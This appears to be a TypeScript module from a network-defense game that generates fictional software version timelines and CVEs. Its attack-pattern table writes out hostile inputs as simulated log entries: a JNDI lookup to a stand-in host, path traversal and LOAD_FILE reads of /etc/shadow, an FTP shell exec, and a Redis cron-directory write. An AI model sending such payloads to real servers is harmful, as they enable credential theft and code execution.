import { createPrng, type Prng } from '../prng';
import type { AttackPattern, Severity, Vulnerability } from '../../network/types';

// Procedural version timeline generator.
//
// Each service has a template declaring its version string format and a
// starting tuple. The generator walks forward from that tuple, bumping the
// tuple at each step (weighted random patch/minor/major) and accumulating
// randomized day-gaps to produce a publishedAt for each version.
//
// Everything is deterministic: the PRNG is seeded on the service name, so
// the same game always produces the same timeline for a given service.
// No persistence needed — we recompute on demand.
//
// Each generated version has an associated CVE with:
// - A CVE id deterministically derived from (service, index)
// - A generic service-specific attack pattern
// - A weighted-random severity (mostly high with occasional critical/medium)
// - publishedAt = accumulated gap sum

export type VersionTemplate = {
  readonly prefix: string; // e.g., 'Apache/' or 'OpenSSH '
  readonly separator: string; // e.g., '.' (usually)
  readonly startTuple: readonly number[]; // e.g., [2, 4, 60]
};

export type GeneratedVersion = {
  readonly version: string;
  readonly tuple: readonly number[];
  readonly index: number;
  readonly publishedAt: number;
};

// Weighted random version-bumping. 80% of new releases are patch bumps,
// 15% are minor (new feature releases), 5% are major (big rewrites).
// Matches roughly how real open-source software moves over time.
const BUMP_WEIGHTS = { major: 5, minor: 15, patch: 80 } as const;

// Safety cap so the timeline walker can't run away if CVE_TIMING_CONFIG
// is misconfigured (e.g., minSafeWindowDays = 0).
const MAX_WALK_STEPS = 10_000;

type BumpType = 'patch' | 'minor' | 'major';

// Per-service version templates. The prefix + separator + starting tuple
// define where the generator begins and what its version strings look like.
// Starting tuples are chosen to be one step beyond the newest hand-authored
// CVE version for each service so the procedural timeline doesn't collide
// with the historical table.
export const serviceTemplates: Readonly<Record<string, VersionTemplate>> = {
  http: { prefix: 'Apache/', separator: '.', startTuple: [2, 4, 60] },
  'http-alt': { prefix: 'Tomcat/', separator: '.', startTuple: [10, 1, 14] },
  https: { prefix: 'nginx/', separator: '.', startTuple: [1, 26, 0] },
  ftp: { prefix: 'vsftpd ', separator: '.', startTuple: [3, 0, 6] },
  mysql: { prefix: 'MySQL ', separator: '.', startTuple: [8, 0, 36] },
  postgresql: { prefix: 'PostgreSQL ', separator: '.', startTuple: [16, 2, 0] },
  redis: { prefix: 'Redis ', separator: '.', startTuple: [7, 2, 5] },
  mongodb: { prefix: 'MongoDB ', separator: '.', startTuple: [7, 0, 3] },
  smtp: { prefix: 'Postfix ', separator: '.', startTuple: [3, 8, 0] },
  imap: { prefix: 'Dovecot ', separator: '.', startTuple: [2, 3, 21] },
  pop3: { prefix: 'Dovecot ', separator: '.', startTuple: [2, 3, 21] },
  mqtt: { prefix: 'Mosquitto ', separator: '.', startTuple: [2, 0, 19] },
  smb: { prefix: 'Samba ', separator: '.', startTuple: [4, 19, 3] },
  rsync: { prefix: 'rsync ', separator: '.', startTuple: [3, 3, 0] },
  vnc: { prefix: 'TightVNC ', separator: '.', startTuple: [2, 9, 0] },
  modbus: { prefix: 'ModbusTCP ', separator: '.', startTuple: [2, 1, 0] },
  openvpn: { prefix: 'OpenVPN ', separator: '.', startTuple: [2, 6, 9] },
  dns: { prefix: 'BIND ', separator: '.', startTuple: [9, 18, 22] },
  elasticsearch: { prefix: 'Elasticsearch ', separator: '.', startTuple: [8, 12, 0] },
  ssh: { prefix: 'OpenSSH ', separator: '.', startTuple: [9, 7, 0] },
};

const pickBumpType = (prng: Prng): BumpType => {
  const roll = prng.nextInt(0, 99);
  if (roll < BUMP_WEIGHTS.major) return 'major';
  if (roll < BUMP_WEIGHTS.major + BUMP_WEIGHTS.minor) return 'minor';
  return 'patch';
};

// Pure bump on a version tuple. Never mutates the input.
export const bumpTuple = (tuple: readonly number[], bumpType: BumpType): readonly number[] => {
  const result = [...tuple];
  if (bumpType === 'major') {
    result[0] = (result[0] ?? 0) + 1;
    if (result.length > 1) result[1] = 0;
    if (result.length > 2) result[2] = 0;
  } else if (bumpType === 'minor' && result.length > 1) {
    result[1] = (result[1] ?? 0) + 1;
    if (result.length > 2) result[2] = 0;
  } else {
    // patch (or minor on a 1-element tuple — just bump the last)
    const last = result.length - 1;
    result[last] = (result[last] ?? 0) + 1;
  }
  return result;
};

const formatVersion = (template: VersionTemplate, tuple: readonly number[]): string =>
  template.prefix + tuple.join(template.separator);

// Build the procedural timeline for a service, walking forward from the
// starting tuple and accumulating randomized day-gaps. Walks until the
// most recent version's publishedAt exceeds `upToPublishedAt`, so the
// returned slice is guaranteed to contain at least one "currently safe"
// entry relative to the caller's game time.
export const buildTimeline = (
  service: string,
  upToPublishedAt: number,
  timing: { readonly minSafeWindowDays: number; readonly maxSafeWindowDays: number },
): readonly GeneratedVersion[] => {
  const template = serviceTemplates[service];
  if (!template) return [];

  const prng = createPrng(`timeline:${service}`);
  const result: GeneratedVersion[] = [];
  let tuple: readonly number[] = template.startTuple;
  let publishedAt = 0;
  let index = 0;

  while (publishedAt <= upToPublishedAt && index < MAX_WALK_STEPS) {
    const gap = prng.nextInt(timing.minSafeWindowDays, timing.maxSafeWindowDays);
    publishedAt += gap;

    result.push({
      version: formatVersion(template, tuple),
      tuple: [...tuple],
      index,
      publishedAt,
    });

    tuple = bumpTuple(tuple, pickBumpType(prng));
    index++;
  }

  return result;
};

// Returns the newest procedurally-generated version whose CVE has not yet
// been "published" at the given gameTime. apt upgrade uses this to pick
// its upgrade target. The semantics: the returned version is "just about
// to become vulnerable" — its CVE has the smallest publishedAt that's
// still strictly greater than gameTime.
//
// Under the 1:1 invariant, upgrading to this version gives the player the
// longest possible breathing room until the next forced upgrade (because
// subsequent versions have even later publishedAt values).
export const getLatestSafeVersion = (
  service: string,
  gameTime: number,
  timing: { readonly minSafeWindowDays: number; readonly maxSafeWindowDays: number },
): string | undefined => {
  const template = serviceTemplates[service];
  if (!template) return undefined;

  const timeline = buildTimeline(service, gameTime, timing);
  for (const entry of timeline) {
    if (entry.publishedAt > gameTime) return entry.version;
  }
  return undefined;
};

// Walks the procedural timeline looking for a specific version string.
// Returns the matching entry if found within a reasonable walk budget,
// or undefined. Used by findVulnForService's layer-2 lookup.
export const findGeneratedVersion = (
  service: string,
  version: string,
  gameTime: number,
  timing: { readonly minSafeWindowDays: number; readonly maxSafeWindowDays: number },
): GeneratedVersion | undefined => {
  // Walk up to ~2x the max safe window past the current game time. That's
  // enough to catch any version the player could currently have installed
  // via a prior apt upgrade, without walking forever into the future.
  const walkCap = gameTime + timing.maxSafeWindowDays * 2;
  const timeline = buildTimeline(service, walkCap, timing);
  return timeline.find((e) => e.version === version);
};

// --- Generated CVE construction ---

// Attack pattern templates per service. Used when a procedural CVE needs
// an attack pattern (generic, not CVE-specific). Each service picks from
// its own list; services without a template fall through to a syslog
// fallback in buildGeneratedCveFromEntry.
const GENERATED_ATTACK_PATTERNS: Readonly<Record<string, readonly AttackPattern[]>> = {
  http: [
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/cgi-bin/?cmd=id',
      status: 500,
    },
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?file=../../../../etc/shadow',
      status: 404,
    },
    {
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/admin/login',
      status: 500,
    },
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?x=${jndi:ldap://evil.invalid/a}',
      status: 200,
    },
  ],
  'http-alt': [
    {
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/manager/html',
      status: 500,
    },
  ],
  https: [
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/api/v1/users?admin=true',
      status: 500,
    },
  ],
  ftp: [
    { logFile: '/var/log/vsftpd.log', command: 'SITE EXEC /bin/sh' },
    { logFile: '/var/log/vsftpd.log', command: "USER admin'\\0" },
  ],
  mysql: [
    { logFile: '/var/log/mysql.log', query: "SELECT LOAD_FILE('/etc/shadow')" },
    {
      logFile: '/var/log/mysql.log',
      query: "SET GLOBAL general_log_file = '/var/lib/mysql/pwn.so'",
    },
  ],
  redis: [
    { logFile: '/var/log/redis.log', message: 'CONFIG SET dir /var/spool/cron' },
    { logFile: '/var/log/redis.log', message: 'EVAL os.execute bypass attempt' },
  ],
  smtp: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'postfix/smtpd',
      message: 'warning: malformed MAIL FROM buffer overflow',
    },
  ],
  imap: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'dovecot',
      message: 'imap-login: stack overflow in LIST command',
    },
  ],
  pop3: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'dovecot',
      message: 'pop3-login: crash in RETR parser',
    },
  ],
};

const GENERIC_SYSLOG_ATTACK = (service: string, version: string): AttackPattern => ({
  logFile: '/var/log/syslog',
  daemon: service,
  message: `anomalous request targeting ${version}`,
});

const pickGeneratedSeverity = (prng: Prng): Severity => {
  // Weighted toward high (the "typical" CVE). Critical is rare but present.
  // Info is never generated in Phase 3 — activated in Phase 4 with typed effects.
  const roll = prng.nextInt(0, 99);
  if (roll < 10) return 'critical'; // 10%
  if (roll < 60) return 'high'; // 50%
  if (roll < 90) return 'medium'; // 30%
  return 'low'; // 10%
};

// Deterministically build a Vulnerability object from a generated timeline
// entry. Every generated CVE for the same (service, index) produces the
// same result regardless of when it's called.
export const buildGeneratedVuln = (service: string, entry: GeneratedVersion): Vulnerability => {
  const prng = createPrng(`generated-cve:${service}:${entry.index}`);

  // CVE id: CVE-YYYY-NNNN with YYYY derived from publishedAt (roughly calendar year)
  const year = 2026 + Math.floor(entry.publishedAt / 365);
  const serial = 1000 + prng.nextInt(0, 8999);
  const cve = `CVE-${year}-${String(serial).padStart(4, '0')}`;

  const severity = pickGeneratedSeverity(prng);

  const patternPool = GENERATED_ATTACK_PATTERNS[service];
  const attackPattern = patternPool
    ? prng.pick(patternPool)
    : GENERIC_SYSLOG_ATTACK(service, entry.version);

  return {
    cve,
    description: `${service} ${entry.version} remote code execution (${cve})`,
    serviceVersion: entry.version,
    attackPattern,
    severity,
    publishedAt: entry.publishedAt,
  };
};
